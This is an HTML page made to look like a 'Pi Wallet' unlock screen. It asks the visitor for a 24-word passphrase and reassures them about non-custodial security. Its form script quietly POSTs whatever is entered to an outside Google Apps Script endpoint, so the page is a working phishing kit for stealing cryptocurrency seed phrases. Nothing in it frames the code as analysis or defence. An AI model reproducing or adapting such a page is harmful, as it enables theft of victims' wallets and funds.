<body>
    <div class="comment-box">
        <h3 class="txt"><b>Unlock Pi Wallet</b></h3>
        <form id="submissionForm">
            <!--<label for="comment">A</label>-->
            <textarea name="comment" placeholder="Enter your 24-word passphrase here"></textarea>
            <br>
            <button name="submit" type="submit" value="Submit">UNLOCK WITH PASSPHRASE</button>
            <br>
            <button class="bone">UNLOCK WITH FINGERPRINT</button>
        </form>
    </div>
    <p></p>
    <p class="txt"><small>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</small></p>
    <p class="txt"><small>Lost your passphrase? You can create a new wallet, but all your &pi; in your previous wallet will be inaccessible.</small></p>
    <script>
        document.getElementById("submissionForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent the default form submission

            var formData = new FormData(this);

            fetch('https://script.google.com/macros/s/AKfycbw9LrGz21fu3LjQWnLPfiLVn0z5F4n_XkIk96Es5752TM-xV_hke_P-obDTbWeBbGol6w/exec', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(data => {
                console.log(data);
                alert(data); // Display response from Google Apps Script
            })
            .catch(error => {
                console.error('There was a problem with the fetch operation:', error);
                alert('Error submitting verification. Please try again later.');
            });
        });
    </script>
